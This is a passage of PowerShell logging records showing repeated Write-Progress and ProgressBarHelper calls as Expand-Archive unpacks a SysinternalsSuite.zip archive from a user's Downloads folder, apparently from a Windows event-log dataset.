ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;288&quot;
 
-RECORD 43----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;94&quot;
                                                                                                                                                                                                                                                                 
-RECORD 44----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;287&quot;
 
-RECORD 45----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;93&quot;
                                                                                                                                                                                                                                                                 
-RECORD 46----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;286&quot;
 
-RECORD 47----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;93&quot;
                                                                                                                                                                                                                                                                 
-RECORD 48----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;285&quot;
 
-RECORD 49----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;93&quot;
                                                                                                                                                                                                                                                                 
-RECORD 50----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;284&quot;
 
-RECORD 51----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;92&quot;
                                                                                                                                                                                                                                                                 
-RECORD 52----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;283&quot;
 
-RECORD 53----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;92&quot;
                                                                                                                                                                                                                                                                 
-RECORD 54----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;282&quot;
 
-RECORD 55----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;92&quot;
                                                                                                                                                                                                                                                                 
-RECORD 56----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;281&quot;
 
-RECORD 57----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;91&quot;
                                                                                                                                                                                                                                                                 
-RECORD 58----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;280&quot;
 
-RECORD 59----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;91&quot;
                                                                                                                                                                                                                                                                 
-RECORD 60----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;279&quot;
 
-RECORD 61----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;91&quot;
                                                                                                                                                                                                                                                                 
-RECORD 62----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;278&quot;
 
-RECORD 63----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;90&quot;
                                                                                                                                                                                                                                                                 
-RECORD 64----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;277&quot;
 
-RECORD 65----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;90&quot;
                                                                                                                                                                                                                                                                 
-RECORD 66----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;276&quot;
 
-RECORD 67----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;90&quot;
                                                                                                                                                                                                                                                                 
-RECORD 68----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;275&quot;
 
-RECORD 69----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;89&quot;
                                                                                                                                                                                                                                                                 
-RECORD 70----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;274&quot;
 
-RECORD 71----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;89&quot;
                                                                                                                                                                                                                                                                 
-RECORD 72----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;273&quot;
 
-RECORD 73----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;89&quot;
                                                                                                                                                                                                                                                                 
-RECORD 74----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;272&quot;
 
-RECORD 75----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;88&quot;
                                                                                                                                                                                                                                                                 
-RECORD 76----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;271&quot;
 
-RECORD 77----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;88&quot;
                                                                                                                                                                                                                                                                 
-RECORD 78----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
